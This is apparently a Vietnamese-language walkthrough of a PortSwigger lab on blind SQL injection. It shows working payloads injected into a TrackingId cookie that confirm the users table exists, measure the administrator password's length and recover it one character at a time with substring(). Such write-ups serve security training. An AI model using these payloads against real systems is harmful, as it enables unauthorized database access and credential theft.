# Target Goal: 

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

# Recon:

Đầu tiên ta cần kiểm tra xem param `TrackingId` bị dính blind SQLi hay không bằng cách điều kiện đúng và sai

![image](https://github.com/vanniichan/Portswigger/assets/112863484/5666197b-e4e6-4d3d-8177-7760e23f73e2)

--> dkien đúng --> respond : Welcome.. 

--> dkien sai --> respond : K trả về Welcome

--> Cf có lỗi 

`select tracking-id from tracking-table where trackingId = 'BtZVMZKha6PZ18sT' and (select 'x' from users LIMIT 1)='x' --a`

Câu lệnh trên để chúng ta xác nhận rằng có table `users` trong db (Đây là bài lab đầu tiên nên làm chi tiết)

`select 'x' from users LIMIT 1)='x'`

Nếu có thì mệnh đề này true và ngược lại ( nhớ encode URL )

![image](https://github.com/vanniichan/Portswigger/assets/112863484/0d1ec6a6-cdcd-412f-8205-3b55457c24aa)

Tiếp theo là tìm password, để tìm ra cách duy nhất hữu dụng nhất vẫn là sử dụng điều kiện TRUE FALSE mà server trả về

`select tracking-id from tracking-table where trackingId = 'BtZVMZKha6PZ18sT' and (select username from users where username='administrator' and LENGTH(password)>1)='administrator'--a`

Kiểm tra độ dài của password qua `LENGTH(password)>1 nếu cái này đúng cộng với 2 điều kiện luôn đúng ở trên thì mệnh đề TRUE -->Welcome...

![image](https://github.com/vanniichan/Portswigger/assets/112863484/f1828b07-5845-48e2-bd85-70a2f4a738fe)

Brute-force để tìm chính xác độ dài của nó (Bao gồm 20 kí tự)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/69a4446d-3cd5-49ff-9428-fefcd45e1682)

Giờ thì brute-force password với `substring(password,1,1)`: lây kí tự đầu tiên với độ dài 1 (substring tính index từ 1)

`select tracking-id from tracking-table where trackingId = 'BtZVMZKha6PZ18sT' and (select substring(password,1,1) from users where username='administrator')='a'--a`

Setting sương sương

![image](https://github.com/vanniichan/Portswigger/assets/112863484/c159b6e2-30e5-4d49-93fd-c15375a48326)

![image](https://github.com/vanniichan/Portswigger/assets/112863484/aa3c6db1-f846-4b40-9530-b01c3559d815)

password: `ricehmkkkeymckde68bx`

# Flag:

![image](https://github.com/vanniichan/Portswigger/assets/112863484/96d5b578-5f5a-481e-b45d-9c931021e982)
